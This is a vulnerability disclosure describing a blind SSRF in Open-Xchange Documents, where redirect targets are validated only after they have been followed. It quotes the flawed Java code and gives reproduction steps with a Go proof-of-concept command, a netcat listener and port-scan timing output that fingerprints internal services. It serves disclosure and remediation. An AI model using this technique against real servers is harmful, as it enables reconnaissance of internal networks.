# Summary

Logic in `AddFileAction.getImageDataFromUrl` for fetching images from external URLs when handling `/appsuite/api/oxodocumentfilter&action=addfile` implemented [here](https://gitlab.open-xchange.com/documents/office/-/blob/develop/com.openexchange.office.rest/src/com/openexchange/office/rest/AddFileAction.java#L374) validates the redirected URLs only after following all redirects

```java 
response = httpClient.execute(getRequest, context);

int statusCode = response.getStatusLine().getStatusCode();
if (statusCode == HttpStatus.SC_OK) {
    List<URI> locations = context.getRedirectLocations();
    if (locations != null) {
        for (URI uri : locations) {
            try {
                Optional<OXException> oxException = validator.apply(uri.toURL());
                if (oxException.isPresent()) {
                    throw (RESTException) oxException.get().getCause();
                }
            } catch (MalformedURLException e) {
                throw new RESTException(ErrorCode.GENERAL_ARGUMENTS_ERROR, e);
            }
        };
    }
    long length = response.getEntity().getContentLength();
    ...
}
```
This may be used by an attacker to execute blind SSRF attacks.

# Steps to reproduce

1. Install Open-Xchange and Documents in a virtual machine by following guides https://oxpedia.org/wiki/index.php?title=AppSuite:Open-Xchange_Installation_Guide_for_Debian_9.0 and https://oxpedia.org/wiki/index.php?title=AppSuite:Documents_Installation_Guide#Debian_GNU.2FLinux_9.0_.28valid_from_v7.10.29
2. Inside VM run following command to make netcat listen on `127.0.0.1:7070`
   ```shell script
   nc -l 127.0.0.1 -p 7070
   ```
3. On host machine, install golang from https://golang.org/dl/
4. Download and extract poc.zip file
5. Open terminal / command line and set current directory to extracted poc.zip folder
6. Run command
   ```shell script
   go run . -redirectorAddress="172.16.146.1:8081" -targetPorts="7070" -serverRoot="http://172.16.66.130" -username="testuser" -password="secret"
   ```
   where
   - redirectorAddress: The IP address and port the which redirector server should bind to. This IP address should be accessible from the VM
   - targetPorts: Port inside VM where netcat is listening to
   - serverRoot: Base URL of open-xchange server
   - serverUser: Username of any user in open-xchange server
   - serverPass: Password of user in open-xchange server
   
Running above command will display following output in netcat
```shell script
GET /image.png HTTP/1.1
Accept: *
Accept-Encoding: gzip
Host: 127.0.0.1:7070
Connection: Keep-Alive
User-Agent: Open-Xchange Image Url Data Fetcher
```
   
# Impact
Since this is a blind SSRF, it is not possible to read the response of HTTP requests. However this vulnerability can be used for reconnaissance.

### Example: Port Scan by measuring response time
To run a port scan on ports 7070,61616,8004,80,22,25,8080,3125 on the local network of server, execute the following command
```shell script
go run . -redirectorAddress="172.16.146.1:8081" -targetPorts="7070,61616,8004,80,22,8080,3125" -serverRoot="http://172.16.66.130" -username="testuser" -password="secret" -numSamples=20
```
Output:
```shell script
2020/05/04 13:32:42 7070: 2.220000
2020/05/04 13:32:42 61616: 3567.000000
2020/05/04 13:32:42 8004: 2.980000
2020/05/04 13:32:42 80: 3.180000
2020/05/04 13:32:42 22: 34.600000
2020/05/04 13:32:42 25: 2169.333333
2020/05/04 13:32:42 8080: 2.560000
2020/05/04 13:32:42 3125: 3.000000
```
We can use lsof to see open ports inside the VM
```shell script
sudo lsof -nP -iTCP -sTCP:LISTEN
```
Output:
```shell script
COMMAND  PID         USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
java     467 open-xchange   15u  IPv6  13049      0t0  TCP 172.16.66.130:9994 (LISTEN)
java     467 open-xchange   16u  IPv6  15970      0t0  TCP *:42319 (LISTEN)
java     467 open-xchange   24u  IPv6  14136      0t0  TCP 127.0.0.1:61616 (LISTEN)
java     467 open-xchange   33u  IPv6  16419      0t0  TCP *:8004 (LISTEN)
java     489 open-xchange   37u  IPv6  14138      0t0  TCP 127.0.0.1:9999 (LISTEN)
java     489 open-xchange   42u  IPv6  17565      0t0  TCP 127.0.0.1:1099 (LISTEN)
java     489 open-xchange   47u  IPv6  14144      0t0  TCP 127.0.0.1:5701 (LISTEN)
java     489 open-xchange  127u  IPv6  15345      0t0  TCP *:36149 (LISTEN)
java     489 open-xchange  144u  IPv6  17559      0t0  TCP 127.0.0.1:8009 (LISTEN)
apache2  526         root    3u  IPv6  13789      0t0  TCP *:80 (LISTEN)
apache2  527     www-data    3u  IPv6  13789      0t0  TCP *:80 (LISTEN)
apache2  528     www-data    3u  IPv6  13789      0t0  TCP *:80 (LISTEN)
mysqld   695        mysql   26u  IPv4  13847      0t0  TCP 127.0.0.1:3306 (LISTEN)
exim4   1077  Debian-exim    3u  IPv4  13115      0t0  TCP 127.0.0.1:25 (LISTEN)
exim4   1077  Debian-exim    4u  IPv6  13116      0t0  TCP [::1]:25 (LISTEN)
sshd    1345         root    3u  IPv4  14259      0t0  TCP 172.16.66.130:22 (LISTEN)
sshd    1345         root    4u  IPv4  14261      0t0  TCP 127.0.0.1:22 (LISTEN)
```

From the above outputs, following observations can be made:
- As we can see for closed ports 7070, 8080 and 3125, the response times are low (~ less than 3ms)
- For open ports, depending on the type of listening connection, response time varies
  - For ssh (port 22) the response time is ~34ms
  - For exim (port 25) the response time is ~2170ms
  - For ActiveMQ (port 61616) the reponse time is ~3567ms
  - For http (port 80 and 8004) the response time is ~3ms (this type is hard to distinguish from closed ports)
  
So an attacker can use this vulnerability to detect most open ports and can use the response time to detect the type of connection (ssh / exim / activemq etc.)